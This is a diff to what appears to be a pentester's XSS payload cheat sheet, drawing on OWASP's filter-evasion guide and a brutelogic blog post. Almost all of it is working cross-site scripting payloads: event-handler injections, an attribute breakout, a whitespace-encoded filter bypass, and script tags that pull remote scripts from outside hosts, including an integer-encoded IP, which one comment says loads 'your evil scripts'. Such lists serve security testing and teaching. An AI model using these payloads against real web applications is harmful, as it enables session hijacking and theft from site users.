@@ -1,6 +1,27 @@
 https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
 
+
+### Generic check for filtering characters
 '';!--"<XSS>=&{()}
+
+### http://brutelogic.com.br/blog/xss-payload-scheme/
+<b onclick=alert(1)>click me!
+<img src=x onerror=alert(1)>
+<frameset><frame src onload=alert(1)>
+<svg/onload=alert(1)>
+><script>alert(1)// # useful when your input goes into a value="" tag.
+
+<script src=//brutelogic.com.br/1> # example of how to load your evil scripts into the page
+<script src=//3334957647/1>       # IP address in its undotted integer format
+
+<table><thead%0Cstyle=font-size:700px%0Donmouseover%0A=%0Bconfirm(1)%09><td>AAAAAAAAA
+
+
+
+### schemes for XSS tags
+extra1 <tag extra2 handler=code> extra3
+extra1 <tag handler=code extra2> extra3
+
 
 
 <SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
